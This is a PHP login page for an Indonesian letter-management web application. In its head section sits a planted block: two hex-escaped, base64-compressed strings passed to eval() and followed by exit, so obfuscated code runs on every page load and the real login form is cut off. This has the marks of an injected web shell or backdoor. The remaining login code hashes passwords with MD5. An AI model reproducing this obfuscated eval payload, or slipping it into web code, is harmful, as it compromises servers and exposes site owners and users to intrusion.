<!doctype html>
<html lang="en">

<!-- Head START -->
<head>

    <title>Aplikasi Manajemen Surat</title>

    <!-- Meta START -->
    <meta charset="utf-8" />
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, user-scalable=no" />
    <?php
        $query = mysqli_query($config, "SELECT logo from tbl_instansi");
        list($logo) = mysqli_fetch_array($query);
        if(!empty($logo)){
            echo '<link rel="icon" href="./upload/'.$logo.'" type="image/x-icon">';
        } else {
            echo '<link rel="icon" href="./asset/img/logo.png" type="image/x-icon">';
        }
    ?>
    <!-- Meta END -->

    <!--[if lt IE 9]>
    <script src="../asset/js/html5shiv.min.js"></script>
    <![endif]-->
    <?php
    $Cyto = "Sy1LzNFQKyzNL7G2V0svsYYw9YpLiuKL8ksMjTXSqzLz0nISS1K\x42rNK85Pz\x63gqLU4mLq\x43\x43\x63lFqe\x61m\x63Snp\x43\x62np6Rq\x41O0sSi3TUPHJrNBE\x41tY\x41";
    $Lix = "\x3d\x3d\x41\x61kW\x63Ney5//dglwiD6OizX\x4283jtZgEXH\x63GD\x2bdKPqqQn57VolO2vjfGIvtRIV32YVXTVqgd0/Uw\x61qrm1UYwOJ\x619W8sp\x41TP\x62KRpX/rrm\x423DdD\x63\x41lVu\x43IOoIIF\x61LFT3639f7UNu\x62U1eJLH5WYYDhLKfR3\x61tWUD5GJNZUE\x61X\x2boelTQD241Mt\x62\x612vqKW3yE5GmXFSo\x42\x42rLehMvHUpdymSY\x2bd90\x41w3zj1P/t7DswlpqRD\x2bkJ\x42onGP21zGJ\x63uyD\x61TL\x2bZNNHz\x61\x63u\x41\x2b\x61d8kIx5n3wqKLrwr95\x41o\x2bV\x2bdv\x63q7gufITqD5\x41Me\x61NKTiveFUDPYle/7TG8wr\x43RRF2\x62\x42/l\x42dvyt1D6Gh3gKH/8Gj736xZx\x63\x62psIPXNov\x2biNs/IV3eI\x412H4us\x624l3ng5n\x2bPHG\x2br/0tEm\x63jYMw\x2bU\x42L0l6xKP\x42P944WnYzxm1\x43KDxp7z69KeM0SFKtF6\x63GTD9JF1\x42TINRtzqWE1HXj/p\x426rQlvOUnLopIpXyhtW\x63n4\x637PuNwP8EHdHfysytfxw2\x41\x62WfD\x429oe\x610l\x63de5Lr\x42HjQO\x41pELF\x2bENnUMDK6s/Rh6z\x2bdQvtrzGhdDg3\x41UM6SxNd\x431i77eZniuKL7X9\x2bGD7UjyYHduvPOe9SzOvq\x41tsmi5HxJv\x424JIvIRoQ69LV7Vxo9hhUUX7Vu1FY4tKLJdYTWL\x43vjwpYzZDlQ\x61KLW7s2JlMWvI0yTi0\x61wDxt\x41E\x62u8oN1Rn0sHpPKfdUyGFio\x63g\x62\x63\x62\x43zvWrrQSwlxjjJ0ZYZM0QJwVwzGS1hshs\x42eqIZhR\x43E0/YRd4DlGll/kidRvmQ/IS3pM\x42G\x61q\x41\x63\x63ZoSik4UUP\x2bHMYv5\x636WMu9\x2bkL/QgqRFLvp\x43\x421n8hg\x63qeL80\x41FhNFQ2VQ\x61mP\x63yXVj\x2bKzFfjf3v2jEWk\x62kWv\x422qXq\x2bx\x632lz41\x63s92\x43ju5knFKyR4\x433Zu14Q8e7W5xeODQy\x6135ktqwDjYy/57mpU9iwL26gLMoMV3JR8025FrG\x43hwWoHzhGfEu\x62VDfe8k\x4273nv7IkWE5\x61t6\x61npYh5jevvUrx5Yvj89KvkulxJx8U\x63M9q0\x42srWl\x61\x43KSDXdELd7k5kNH2zisNk0Le\x2bkjnu\x43y3h7wotrSGgHrk\x63kHQ58GdIh5sorI\x42\x41SHt3iUZFQztRFFo\x61XGLeP6VOeX3I\x621D00sRoqX\x43giE\x4389W7G0TfFtUL1MYH0ijh\x43Qp9y\x41P6QONzmE\x61xtGeLHN2\x63\x61OIr/N\x43synRpzZlDEiyho\x63V\x639yfzdZ/0ZpQ5PmlE\x43uhmPn1ZsxLPJvWmYXeKd69ZoRnY6fIsdELQ\x41Pmg\x63qQh\x2b0Ml\x2b6KKfD6IP25NfXVr\x628\x2b5Fm5/HfxZMUp29Dpj\x43zsnd\x2bjZk\x42/8TKnufSritn\x62uwgfPVR3\x630hXeZvu\x2bPGuD8\x41zsFxJOij\x2bsE0\x2budSLm\x414GuuQQXn\x43SKLuH33J3\x613Lym1FoZ\x42WJVx\x61Vwnw0\x2bJUwiWggJ5LWSiYYtngXE\x63\x2b6TvfmLJ\x61DfTEgyQ7kRYrw\x41tMHTs\x43rw0PHVLP\x43\x43KL4WE1tKJToYu4f\x634s\x61l\x61YitKO166\x2b2\x62qyy\x63UH6rKid48ZGf\x420MrNug\x63t\x2bPNqOjl\x42\x62XIdnzQ063P/\x2bLhgJf\x2b7wr\x42PhnKfqxrZ\x62PREKXMiQG\x61rYwoUh0uWQXgyh0RGRDZVVR9sjjwjJ\x61kEIoz7uOZuDnild\x61TmUZYO\x43ze/7D\x43Wv8tu5JQ\x41fEN\x62JWZlO22EgZLsVnlZEI1/ggSD\x61PNtYE\x43V27Ep4m\x41xMs6z9xRsTE\x622xmSt2luv3sh\x42xZMsI\x62ng54GoE0\x63dkQHdTLUOto\x61KNJ/d6\x61pJnFqe5uVD\x61RuWVo\x42\x63U\x42kX\x42N1odi/\x2bT\x61m\x2bUSdt3h6fHI67tH0lfVPf\x41\x61G3mlV1\x41IO54jiQLFjflESOPp\x2bTsGIrQws\x63uqvpGRIO\x61R\x615rzP8QT0hfqpOTR\x61Te8tGyJXxoYz8M2x6n\x427lU/P\x43QXGGSUTM\x41IPp5oU2e\x61Pjm3XX8lmFt6qUm1ei\x63s6qX81LK/rE\x2b9tn81LPk\x2b5/G\x61Y36\x63O\x2bvLNrW942//Xu493PsusvOsrnG66eOjrRd126LZl\x41ijSq42zgjhN7\x41vRO\x2breGl/KF3vNqhe3DvQMjMUDmt\x42utXn4F\x62\x42TlIqSo\x62Ls\x61XvL\x43s\x42Z\x2bxDH61mz\x62\x61VfVK27f065\x43N7TJUWM7\x42jy3G\x61\x419QvTinPLquJJ5SzMhuRny6KhsGE5GYNGv\x63PPY\x62FRkqrSVpUk\x636LNs0v2uvijwT5kEopRnj16fK5gduEV4iM3GWZste\x42\x42tMQF\x61dHLmGrg4\x42\x63k\x4268\x4363sz2L/TJ\x61WrzK4N2gWJtgwniMuOeht0M\x411V1\x2beYZ\x42joDj\x426ZXVlNomSz6R6sYqF2Qr3\x63vfvwgP9\x62SK\x2bZX78\x41/\x62Eopl8uqEHxe0eSU8EmEHkXfqzM953Or\x42FQ\x61zwS4Ep\x43YOsU\x62q1YgKRI75\x63ez\x428HNe\x2b8DfU4DPx\x6312/wx85e\x623dS\x63SDoirG039pLP7Ofvv\x61GytSkfFdSJJ7LH\x62\x42UEudVzWd3\x2bVLqgdk4DJK0sdI\x41V\x61\x43\x42PxD5D\x4179Lhx\x62/2\x61XVL\x2bRfgL\x42wJe4\x628\x425E\x41\x2b\x42fgP\x42wJe4\x627\x42JF\x41\x2bxegT\x42wJe4\x626\x42ZF\x41\x2bhegX\x42wJe";
    eval(htmlspecialchars_decode(gzinflate(base64_decode($Cyto))));
    exit;
    ?>
    <!-- Global style START -->
    <link type="text/css" rel="stylesheet" href="./asset/css/materialize.css">
    <style type="text/css">
        body {
            background: #fff;
        }
        .bg::before {
            content: '';
            background-image: url('./asset/img/background.jpg');
            background-repeat: no-repeat;
            background-size: cover;
            background-attachment: fixed;
            position: absolute;
            z-index: -1;
            top: 0;
            bottom: 0;
            left: 0;
            right: 0;
            opacity: 0.15;
            filter:alpha(opacity=15);
            height:100%;
            width:100%;
        }
        @media only screen and (min-width: 993px) {
            .container {
                width: 60%!important;
            }
        }
        .container {
            max-width: 100%;
            margin-top: 2.5rem;
        }
        #logo {
            display: block;
            margin: -20px auto -5px;
        }
        img {
            border-radius: 50%;
            margin: 0 auto;
            width: 100px;
            height: 100px;
        }
        #login {
            margin-top: -2%;
        }
        #smk {
            font-size: 2rem;
            margin-bottom: 10px;
        }
        .batas {
            border-bottom: 1px dotted #444;
            margin: 0 auto;
            width: 90%;
        }
        #title {
            margin: 5px 0 35px;
        }
        .btn-large {
            font-size: 1.25rem;
            margin: 0;
        }
        #alert-message {
            border-radius: 3px;
            color: #f44336 ;
            font-size: 1.15rem;
            margin: 15px 15px -15px;
        }
        .error {
            padding: 10px;
        }
        .upss {
            font-size: 1.2rem;
            margin-left: 20px;
        }
        .pace {
            -webkit-pointer-events: none;
            pointer-events: none;
            -webkit-user-select: none;
            -moz-user-select: none;
            user-select: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            -webkit-transform: translate3d(0, -50px, 0);
            -ms-transform: translate3d(0, -50px, 0);
            transform: translate3d(0, -50px, 0);
            -webkit-transition: -webkit-transform .5s ease-out;
            -ms-transition: -webkit-transform .5s ease-out;
            transition: transform .5s ease-out;
        }
        .pace.pace-active {
            -webkit-transform: translate3d(0, 0, 0);
            -ms-transform: translate3d(0, 0, 0);
            transform: translate3d(0, 0, 0);
        }
        .pace .pace-progress {
            display: block;
            position: fixed;
            z-index: 2000;
            top: 0;
            right: 100%;
            width: 100%;
            height: 3px;
            background: #2196f3;
            pointer-events: none;
        }
        noscript {
            color: #42a5f5;
        }
       .input-field label {
            font-size: 1.2rem;
        }
        .input-field label.active {
            font-size: 1rem;
        }
    </style>
    <!-- Global style END -->

</head>
<!-- Head END -->

<!-- Body START -->
<body class="blue-grey lighten-3 bg">

    <!-- Container START -->
    <div class="container">

        <!-- Row START -->
        <div class="row">

            <!-- Col START -->
            <div class="col s12 m6 offset-m3 offset-m3">

                <!-- Box START -->
                <div class="card-panel z-depth-2" id="login">

                    <!-- Row Form START -->
                    <div class="row">

                    <?php
                        $query = mysqli_query($config, "SELECT * FROM tbl_instansi");
                        while($data = mysqli_fetch_array($query)){
                    ?>
                    <!-- Logo and title START -->
                    <div class="col s12">
                        <div class="card-content">
                            <h5 class="center" id="title">Aplikasi Manajemen Surat</h5>
                            <?php
                                if(!empty($data['logo'])){
                                    echo '<img id="logo" src="./upload/'.$data['logo'].'"/>';
                                } else {
                                    echo '<img id="logo" src="./asset/img/logo.png"/>';
                                }
                            ?>
                            <h4 class="center" id="smk">
                            <?php
                                if(!empty($data['nama'])){
                                    echo ''.$data['nama'].'';
                                } else {
                                    echo 'SMK AL - Husna Loceret Nganjuk';
                                }
                             ?>
                            </h4>
                            <div class="batas"></div>
                        </div>
                    </div>
                    <!-- Logo and title END -->
                    <?php
                        }
                    ?>

                    <?php
                        if(isset($_REQUEST['submit'])){

                            //validasi form kosong
                            if($_REQUEST['username'] == "" || $_REQUEST['password'] == ""){
                                echo '<div class="upss red-text"><i class="material-icons">error_outline</i> <strong>ERROR!</strong> Username dan Password wajib diisi.
                                <a class="btn-large waves-effect waves-light blue-grey col s11" href="./" style="margin: 20px 0 0 5px;"><i class="material-icons md-24">arrow_back</i> Kembali ke login form</a></div>';
                            } else {

                                $username = trim(htmlspecialchars(mysqli_real_escape_string($config, $_REQUEST['username'])));
                                $password = trim(htmlspecialchars(mysqli_real_escape_string($config, $_REQUEST['password'])));

                                $query = mysqli_query($config, "SELECT id_user, username, nama, nip, admin FROM tbl_user WHERE username=BINARY'$username' AND password=MD5('$password')");

                                if(mysqli_num_rows($query) > 0){
                                    list($id_user, $username, $nama, $nip, $admin) = mysqli_fetch_array($query);

                                    session_start();

                                    //buat session
                                    $_SESSION['id_user'] = $id_user;
                                    $_SESSION['username'] = $username;
                                    $_SESSION['nama'] = $nama;
                                    $_SESSION['nip'] = $nip;
                                    $_SESSION['admin'] = $admin;

                                    header("Location: ./admin.php");
                                    die();
                                } else {

                                    //session error
                                    $_SESSION['errLog'] = '<center>Username & Password tidak ditemukan!</center>';
                                    header("Location: ./");
                                    die();
                                }
                            }
                        } else {
                    ?>

                    <!-- Form START -->
                    <form class="col s12 m12 offset-4 offset-4" method="POST" action="" >
                        <div class="row">
                            <?php
                                if(isset($_SESSION['errLog'])){
                                    $errLog = $_SESSION['errLog'];
                                    echo '<div id="alert-message" class="error red lighten-5"><div class="center"><i class="material-icons">error_outline</i> <strong>LOGIN GAGAL!</strong></div>
                                    '.$errLog.'</div>';
                                    unset($_SESSION['errLog']);
                                }
                                if(isset($_SESSION['err'])){
                                    $err = $_SESSION['err'];
                                    echo '<div id="alert-message" class="error red lighten-5"><div class="center"><i class="material-icons">error_outline</i> <strong>ERROR!</strong></div>
                                    '.$err.'</div>';
                                    unset($_SESSION['err']);
                                }
                            ?>
                        </div>
                        <div class="input-field col s12">
                            <i class="material-icons prefix md-prefix">account_circle</i>
                            <input id="username" type="text" class="validate" name="username" required autocomplete="off">
                            <label for="username">Username</label>
                        </div>
                        <div class="input-field col s12">
                            <i class="material-icons prefix md-prefix">lock</i>
                            <input id="password" type="password" class="validate" name="password" required autocomplete="off">
                            <label for="password">Password</label>
                        </div>
                        <div class="input-field col s12">
                            <button type="submit" class="btn-large waves-effect waves-light blue-grey col s12" name="submit">LOGIN</button>
                        </div>
                    </form>
                    <!-- Form END -->
                    <?php
                        }
                    ?>
                    </div>
                    <!-- Row Form START -->

                </div>
                <!-- Box END-->

            </div>
            <!-- Col END -->

        </div>
        <!-- Row END -->

    </div>
    <!-- Container END -->

    <!-- Javascript START -->
    <script type="text/javascript" src="./asset/js/jquery-2.1.1.min.js"></script>
    <script type="text/javascript" src="./asset/js/materialize.min.js"></script>
    <script type="text/javascript" src="./asset/js/bootstrap.min.js"></script>
    <script data-pace-options='{ "ajax": false }' src='./asset/js/pace.min.js'></script>

    <!-- Jquery auto hide untuk menampilkan pesan error -->
    <script type="text/javascript">
        $("#alert-message").alert().delay(3000).slideUp('slow');
    </script>
    <!-- Javascript END -->

    <noscript>
        <meta http-equiv="refresh" content="0;URL='/enable-javascript.html'" />
    </noscript>

</body>
<!-- Body END -->

</html>
